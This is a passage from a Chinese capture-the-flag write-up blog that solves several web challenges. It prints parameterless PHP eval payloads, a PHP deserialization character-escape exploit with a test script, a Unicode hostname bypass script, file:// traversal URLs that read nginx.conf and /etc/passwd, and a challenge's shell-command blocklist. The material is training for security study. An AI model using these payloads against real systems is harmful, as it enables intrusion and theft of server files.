class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>无参RCE</p><p><code>et</code>被禁 <code>getenv()</code> <code>getallheaders()</code>  <code>get_defined_vars()</code> 都用不了</p><p>读取文件，不能使用<code>file_get_contents()</code>，但是可以可以使用<code>readfile()</code>或<code>highlight_file()</code>以及其别名函数<code>show_source()</code></p><p>这里使用 session_id()</p><p>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。<br>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。</p><p>其他payload</p><p><code>exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></p><p>current() 返回数组中的当前单元, 默认取第一个值。pos() 是current() 的别名。</p><p>array_reverse() 以相反的元素顺序返回数组</p><p><img src="/2020/08/8月刷题记录/image-20200810002921599.png" alt="image-20200810002921599"></p><p><code>highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code> //多刷新几次</p><p>array_flip()交换数组的键和值</p><p>array_rand()从数组中随机取出一个或多个单元</p><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p>SQL注入，抓包，页面源码都没有有用的信息，后面扫目录拿到源码</p><p>其中config.php有$flag变量，所以应该是读取服务端 config.php文件。</p><p>根据update.php <code>$profile[&#39;nickname&#39;]</code>变量通过传参数组可以绕过<code>die()</code>，从而可控<code>nickname</code></p><p>接着是反序列化 <code>$profile</code> </p><p><code>$user-&gt;update_profile($username, serialize($profile));</code></p><p>反序列化的字符串可控，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//PHP序列化长度变化导致字符逃逸</span></span><br><span class="line"><span class="comment">//PHP反序列化中值的字符读取多少其实是由表示长度的数字控制的，而且只要整个字符串的前一部分能够成功反序列化，这个字符串后面剩下的一部分将会被丢弃</span></span><br><span class="line">$s = <span class="string">"Hello World"</span>;</span><br><span class="line">$a = <span class="keyword">array</span>($s);</span><br><span class="line">var_dump(serialize($a)); <span class="comment">//string(29) "a:1:&#123;i:0;s:11:"Hello World";&#125;"</span></span><br><span class="line">$fake = <span class="string">'a:1:&#123;i:0;s:7:"Hello "";&#125;World";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($fake)); <span class="comment">//string(7) "Hello ""</span></span><br><span class="line"><span class="comment">//我们可以看到，原来的字符串"Hello World"内 "World"改成了一个双引号，s:11 改成 s:7 再是正常结尾时需要有的 ";&#125; 三个字符</span></span><br><span class="line"><span class="comment">//在PHP进行反序列化时，由字符串初始位置向后读取7个字符，即使遇到字符串分解符单双引号也会继续向下读，而后遇到了正常的结束符，达成了正常反序列化的条件，反序列化结束，</span></span><br><span class="line"><span class="comment">//后面的 World";&#125;  几个字符均被丢弃。</span></span><br></pre></td></tr></table></figure><p>虽然<code>$profile[&#39;nickname&#39;]</code>可控，但序列化是在服务器端，<code>s</code>的长度无法控制，也就无法逃逸</p><p>慢慢看源码</p><p>接着在<code>profile.php</code>调用了</p><p><code>$profile=$user-&gt;show_profile($username);</code></p><p>这个<code>show_proflie()</code>具体如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">    $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">    $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line">    $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意<code>filter()</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span>//<span class="title">class</span>.<span class="title">php</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>); <span class="comment">// ' 和 \\ 字符</span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; <span class="comment">// "/'|\\/"</span></span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string); <span class="comment">//  ' 和 \\ 替换成 _</span></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>; <span class="comment">// "/select|insert|update|delete|where/i"</span></span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string); <span class="comment">//同理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 <code>$profile</code>存入数据库未被过滤，取出数据库时却被过滤了</p><p>而如果将<code>where</code>替换成 <code>hacker</code> 例如</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"where"</span> &gt;&gt; <span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"hacker"</span>&gt;&gt;反序列化 <span class="selector-tag">hacke</span>，<span class="selector-tag">r</span>则可以按我们的意愿修改，这样在不修改<span class="selector-tag">s</span>的情况下，控制了反序列化</span><br></pre></td></tr></table></figure><p>接下来的插入数据其实和SQL注入很像，利用 <code>&quot;;}</code>闭合前一部分，接着注入数据</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"66666666666"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">11</span>:<span class="string">"test@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>:&#123;<span class="built_in">i</span>:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"here"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">39</span>:<span class="string">"upload/098f6bcd4621d373cade4e832627b4f6"</span>;&#125;'</span><br><span class="line">在here后面闭合即</span><br><span class="line">&#123;<span class="built_in">i</span>:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"here"</span>;&#125;                                                           <span class="string">"&#125;</span></span><br><span class="line"><span class="string">插入数据</span></span><br><span class="line"><span class="string">&#123;i:0;s:4:"</span>here<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;                            "</span>&#125;</span><br></pre></td></tr></table></figure><p>所以我们要插入 <code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34，即我们需要34个where</p><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phone=<span class="string">"66666666666"</span>;</span><br><span class="line">$email = <span class="string">"test@qq.com"</span>;</span><br><span class="line">$nickname=<span class="keyword">array</span>(<span class="string">'wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";&#125;s:5:"photo";s:10:"config.php";&#125;'</span>);</span><br><span class="line">$file = <span class="keyword">array</span>(<span class="string">"size"</span>=&gt;<span class="string">"10"</span>,<span class="string">"name"</span>=&gt;<span class="string">"test"</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $phone))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $email))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $nickname) || strlen($nickname) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$profile[<span class="string">'phone'</span>] = $phone;</span><br><span class="line">$profile[<span class="string">'email'</span>] = $email;</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $nickname;</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line">var_dump(serialize($profile));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$profile = <span class="string">'a:4:&#123;s:5:"phone";s:11:"66666666666";s:5:"email";s:11:"test@qq.com";s:8:"nickname";a:1:&#123;i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";&#125;s:5:"photo";s:10:"config.php";&#125;";&#125;s:5:"photo";s:39:"upload/098f6bcd4621d373cade4e832627b4f6";&#125;'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span>//<span class="title">class</span>.<span class="title">php</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>); <span class="comment">// ' 和 \\ 字符</span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; <span class="comment">// "/'|\\/"</span></span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string); <span class="comment">//  ' 和 \\ 替换成 _</span></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>; <span class="comment">// "/select|insert|update|delete|where/i"</span></span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string); <span class="comment">//同理</span></span><br><span class="line">true&#125;</span><br><span class="line">$profile = filter($profile);</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line">var_dump($profile[<span class="string">'photo'</span>]);</span><br><span class="line">var_dump($photo);</span><br></pre></td></tr></table></figure><p><img src="/2020/08/8月刷题记录/image-20200810140642188.png" alt="image-20200810140642188"></p><h3 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h3><p><code>blackhat</code>议题之一<code>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</code></p><p><img src="/2020/08/8月刷题记录/1828215-20200113142549010-1977431520.png" alt="1828215-20200113142549010-1977431520"></p><p>根据源码写爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunsplit, urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65535</span>):</span><br><span class="line">        uni = chr(x)</span><br><span class="line">        url = <span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line"></span><br><span class="line">                print(parse.quote(chr(x))+<span class="string">" str: "</span> + uni + <span class="string">' unicode: \\u'</span> + str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure><p>题目提示我们是nginx，所以我们去读取nginx的配置文件</p><p>这里读的路径是 /usr/local/nginx/conf/nginx.conf</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">94</span>cc5e34-bb0b-<span class="number">44</span>bb-b029-ca087a23f0b6.node3.buuoj.cn<span class="regexp">/getUrl?url=file:/</span><span class="regexp">/suctf.c%E2%84%82/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">//u</span>sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure><p>然后读flag就行</p><p>另外一种<a href="https://xz.aliyun.com/t/6281" target="_blank" rel="noopener">思路</a>是突破<code>urlunsplit</code> </p><p>函数定义在 <code>urllib\parse.py</code> 中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">urlunsplit</span><span class="params">(components)</span>:</span></span><br><span class="line">    scheme, netloc, url, query, fragment, _coerce_result = (</span><br><span class="line">                                          _coerce_args(*components))</span><br><span class="line">    <span class="keyword">if</span> netloc <span class="keyword">or</span> (scheme <span class="keyword">and</span> scheme <span class="keyword">in</span> uses_netloc <span class="keyword">and</span> url[:<span class="number">2</span>] != <span class="string">'//'</span>):</span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">and</span> url[:<span class="number">1</span>] != <span class="string">'/'</span>: url = <span class="string">'/'</span> + url</span><br><span class="line">        url = <span class="string">'//'</span> + (netloc <span class="keyword">or</span> <span class="string">''</span>) + url</span><br><span class="line">    <span class="keyword">if</span> scheme:</span><br><span class="line">        url = scheme + <span class="string">':'</span> + url</span><br><span class="line">    <span class="keyword">if</span> query:</span><br><span class="line">        url = url + <span class="string">'?'</span> + query</span><br><span class="line">    <span class="keyword">if</span> fragment:</span><br><span class="line">        url = url + <span class="string">'#'</span> + fragment</span><br><span class="line">    <span class="keyword">return</span> _coerce_result(url)</span><br></pre></td></tr></table></figure><p>从题目源码也可以看出，这个函数的用法大概就是把 <code>url</code> 各个部分组成 <code>list</code> 传进来。</p><p>我们来分析一下这个函数：</p><p>这里的 <code>netloc</code> 就是题目中拿来判断的 <code>host</code>。</p><p>首先第一个 <code>if</code> 判断了 <code>netloc</code> 是否为空，如果不是空就进入代码块，第二个是判断 <code>schema</code> 是否为空。第三个第四个就不分析了。</p><p>仔细看看第二个 <code>if</code>，这里并没有强制要求 <code>netloc</code> 要有东西，假设一下我们传入一个这样的 <code>url</code>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="regexp">//</span><span class="regexp">//</span>abc</span><br></pre></td></tr></table></figure><p>这个 <code>url</code> 传入入 <code>parse.urlparse</code> 时，<code>netloc</code> 是为空的，而 <code>path</code> 为 <code>//abc</code>，当进入到 <code>urlunsplit</code> 后，<code>netloc</code> 为空不进入第一块代码，<code>schema</code> 为 <code>file</code>，进入第二个代码块，拼接后 <code>url</code> 就变成了：<code>file://abc</code></p><p>所以构造<code>file:////suctf.cc/../../../../../etc/passwd</code></p><p>贴下其他nginx配置文件</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：<span class="meta-keyword">/etc/</span>nginx</span><br><span class="line">主配置文件：<span class="meta-keyword">/etc/</span>nginx<span class="meta-keyword">/conf/</span>nginx.conf</span><br><span class="line">管理脚本：<span class="meta-keyword">/usr/</span>lib64<span class="meta-keyword">/systemd/</span>system/nginx.service</span><br><span class="line">模块：<span class="meta-keyword">/usr/</span>lisb64<span class="meta-keyword">/nginx/</span>modules</span><br><span class="line">应用程序：<span class="meta-keyword">/usr/</span>sbin/nginx</span><br><span class="line">程序默认存放位置：<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/nginx/</span>html</span><br><span class="line">日志默认存放位置：<span class="meta-keyword">/var/</span>log/nginx</span><br></pre></td></tr></table></figure><h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>url明显有有问题</p><p><code>img=TXpVek5UTTFNbVUzTURabE5qYz</code> =&gt; base64 =&gt;base64 =&gt; hex =&gt; 555.png</p><p>反过去 加密 <code>index.php</code>下载源码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!isset($_GET[<span class="string">'img'</span>]) || !isset($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    echo <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    die(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    echo(<span class="string">"forbid ~"</span>);</span><br><span class="line">    echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>md5强比较，工具跑一下就出来了</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=test<span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span 